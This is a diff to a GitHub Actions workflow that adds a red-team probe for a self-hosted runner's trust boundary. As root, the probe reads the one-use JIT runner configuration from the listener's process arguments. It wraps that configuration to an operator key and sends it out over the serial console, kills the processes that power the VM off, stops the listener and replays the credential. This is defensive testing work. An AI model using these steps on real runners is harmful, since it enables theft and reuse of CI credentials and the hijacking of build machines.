@@ -13,6 +13,16 @@ on:
         required: false
         type: boolean
         default: false
+      jit_post_release_replay:
+        description: Stop this runner's listener, replay its JIT configuration on this host, and hand it to the operator wrapped for a second-host replay
+        required: false
+        type: boolean
+        default: false
+      replay_recipient_key:
+        description: Base64 PEM of the operator's one-time RSA-4096 public key (required with jit_post_release_replay)
+        required: false
+        type: string
+        default: ""
 
 permissions: {}
 
@@ -630,3 +640,157 @@ jobs:
             failed=1
           fi
           exit "${failed}"
+
+      # Probe N (runner-trust-boundary P8, exception E1). It takes the attacker
+      # position of a sudo-capable job: read the one-use JIT configuration,
+      # disarm the poweroff shim, stop the listener gracefully so its session
+      # is released, then replay the configuration on this host. The value
+      # never reaches the job log: the same-host verdict and the configuration
+      # wrapped to the operator's one-time RSA key go only to the EC2 serial
+      # console, which `goals/runner-trust-boundary/ops/post-release-replay.sh`
+      # reads with AWS credentials and uses for the second-host replay after
+      # this VM is gone. Stopping the listener ends this job, so the run
+      # concludes as failed or cancelled by design; it must run alone.
+      - name: Probe N - post-release JIT replay
+        if: ${{ inputs.jit_post_release_replay && !inputs.redteam && !inputs.jit_replay }}
+        shell: bash
+        env:
+          REPLAY_RECIPIENT_KEY: ${{ inputs.replay_recipient_key }}
+        run: |
+          set -euo pipefail
+          probe_dir=/run/rtb-replay
+          sudo install -d -o root -g root -m 0700 "${probe_dir}"
+          if [[ -z "${REPLAY_RECIPIENT_KEY}" ]]; then
+            echo "Probe N: replay_recipient_key is required"
+            exit 1
+          fi
+          printf '%s' "${REPLAY_RECIPIENT_KEY}" | base64 -d \
+            | sudo tee "${probe_dir}/recipient.pem" > /dev/null
+          if ! sudo openssl pkey -pubin -in "${probe_dir}/recipient.pem" -noout -text 2>/dev/null \
+            | grep -Fq 'Public-Key: (4096 bit)'; then
+            echo "Probe N: replay_recipient_key is not an RSA-4096 public key"
+            exit 1
+          fi
+          sudo tee "${probe_dir}/probe.sh" > /dev/null <<'RTB_PROBE'
+          #!/usr/bin/env bash
+          set -uo pipefail
+          umask 077
+          dir=/run/rtb-replay
+          scratch=/var/tmp/rtb-replay-runner
+          con() { printf 'RTB-%s\n' "$*" > /dev/console 2>/dev/null || true; }
+          note() { con "NOTE $(date -u +%FT%TZ) $*"; }
+          finish() {
+            unset jit
+            rm -rf -- "${scratch}" "${dir}/k" "${dir}/kk" "${dir}/c" "${dir}/listener.log"
+            note "probe finished; holding 180s for console capture"
+            con "DONE"
+            sleep 180
+            shutdown -P now
+          }
+          trap finish EXIT
+
+          listener="$(pgrep -x Runner.Listener | head -1 || true)"
+          if [[ -z "${listener}" ]]; then
+            note "no running listener"; con "VERDICT same-host inconclusive (no running listener)"; exit 1
+          fi
+          jit="$(tr '\0' '\n' < "/proc/${listener}/cmdline" | awk 'f { print; exit } $0 == "--jitconfig" { f = 1 }')"
+          if [[ ! "${jit}" =~ ^[A-Za-z0-9+/=_-]+$ ]]; then
+            note "listener argv held no JIT configuration"; con "VERDICT same-host inconclusive (argv unreadable)"; exit 1
+          fi
+          note "read the JIT configuration from listener argv as root (length ${#jit})"
+
+          # Hand-off for the second host: AES-256 under a random key, the key
+          # wrapped with RSA-OAEP-SHA256 to the operator's one-time public key.
+          openssl rand -hex 32 > "${dir}/k"
+          printf '%s' "${jit}" | openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt \
+            -pass "file:${dir}/k" -out "${dir}/c"
+          openssl pkeyutl -encrypt -pubin -inkey "${dir}/recipient.pem" \
+            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 \
+            -in "${dir}/k" -out "${dir}/kk"
+          rm -f -- "${dir}/k"
+          base64 -w 64 "${dir}/kk" | while IFS= read -r line; do con "K ${line}"; done
+          base64 -w 64 "${dir}/c" | while IFS= read -r line; do con "C ${line}"; done
+          con "WRAPPED"
+
+          # Disarm the shim: kill every runner-user ancestor so nothing powers
+          # the VM off when the listener exits. The root start script remains;
+          # its terminate call has no credentials once IMDS is disabled.
+          runner_uid="$(stat -c %u /proc/${listener})"
+          p="$(awk '{ print $4 }' "/proc/${listener}/stat")"
+          while [[ "${p}" -gt 1 ]]; do
+            parent="$(awk '{ print $4 }' "/proc/${p}/stat" 2>/dev/null || echo 1)"
+            if [[ "$(stat -c %u "/proc/${p}" 2>/dev/null)" == "${runner_uid}" ]]; then
+              note "killing runner-user ancestor $(cat "/proc/${p}/comm" 2>/dev/null)"
+              kill -KILL "${p}" 2>/dev/null || true
+            fi
+            p="${parent}"
+          done
+
+          # Release the session the way an orderly listener exit does.
+          kill -INT "${listener}" 2>/dev/null || true
+          stop_mode=SIGINT
+          for _ in $(seq 1 60); do
+            pgrep -x 'Runner.Listener|Runner.Worker' > /dev/null || break
+            sleep 1
+          done
+          if pgrep -x 'Runner.Listener|Runner.Worker' > /dev/null; then
+            pkill -TERM -x 'Runner.Listener|Runner.Worker' || true; stop_mode=SIGTERM; sleep 15
+          fi
+          if pgrep -x 'Runner.Listener|Runner.Worker' > /dev/null; then
+            pkill -KILL -x 'Runner.Listener|Runner.Worker' || true; stop_mode=SIGKILL; sleep 2
+          fi
+          note "original listener ended (${stop_mode})"
+          con "LISTENER-ENDED $(date -u +%FT%TZ) ${stop_mode}"
+          sleep 45
+
+          mkdir -p "${scratch}"
+          cp -a /opt/actions-runner/bin "${scratch}/bin"
+          cp -a /opt/actions-runner/externals "${scratch}/externals"
+          (cd "${scratch}" && RUNNER_ALLOW_RUNASROOT=1 "${scratch}/bin/Runner.Listener" --help > /dev/null 2>&1 || true)
+          (cd "${scratch}" && RUNNER_ALLOW_RUNASROOT=1 exec timeout 120 "${scratch}/bin/Runner.Listener" run \
+            --jitconfig "${jit}" > "${dir}/listener.log" 2>&1) &
+          replay=$!
+          note "same-host replay started"
+          verdict=""
+          for _ in $(seq 1 125); do
+            if grep -Eq 'Listening for Jobs|Connected to GitHub' "${dir}/listener.log"; then
+              pkill -KILL -f "${scratch}/bin/Runner" || true
+              verdict="accepted"; break
+            fi
+            line="$(grep -Em1 \
+              -e 'A session for this runner already exists' \
+              -e 'already (been )?(registered|used|configured|exists)' \
+              -e '[Ii]nvalid (JIT|jit|runner) ?(config|configuration|token)' \
+              -e '(token|configuration|JIT config|jitconfig) (has )?expired' \
+              -e 'registration (has been )?deleted|deleted from the server' \
+              -e '\bUnauthorized\b|\bForbidden\b' \
+              -e '[Rr]unner (was )?not found' \
+              -e '(access|permission) denied' \
+              "${dir}/listener.log" | tr -d '\r' || true)"
+            if [[ -n "${line}" ]]; then
+              pkill -KILL -f "${scratch}/bin/Runner" || true
+              line="${line//${jit}/[redacted]}"
+              line="$(printf '%s' "${line}" | sed -E 's/--jitconfig[ =]+[A-Za-z0-9+\/_=-]+/--jitconfig [redacted]/g' | cut -c1-200)"
+              if [[ "${line}" == *'A session for this runner already exists'* ]]; then
+                verdict="session-held (${line})"
+              else
+                verdict="rejected (${line})"
+              fi
+              break
+            fi
+            kill -0 "${replay}" 2>/dev/null || break
+            sleep 1
+          done
+          pkill -KILL -f "${scratch}/bin/Runner" || true
+          wait "${replay}" 2>/dev/null || true
+          if [[ -z "${verdict}" ]]; then
+            first="$(sed -n '/[^[:space:]]/{s/\r$//;p;q;}' "${dir}/listener.log" | cut -c1-200)"
+            first="${first//${jit}/[redacted]}"
+            verdict="inconclusive (${first:-no listener output})"
+          fi
+          con "VERDICT same-host ${verdict}"
+          RTB_PROBE
+          sudo chmod 0700 "${probe_dir}/probe.sh"
+          sudo systemd-run --unit=rtb-post-release-replay --collect /bin/bash "${probe_dir}/probe.sh"
+          echo "Probe N armed on ${RUNNER_NAME:-unknown}; the probe stops this job's listener, so the job ends here"
+          sleep 300
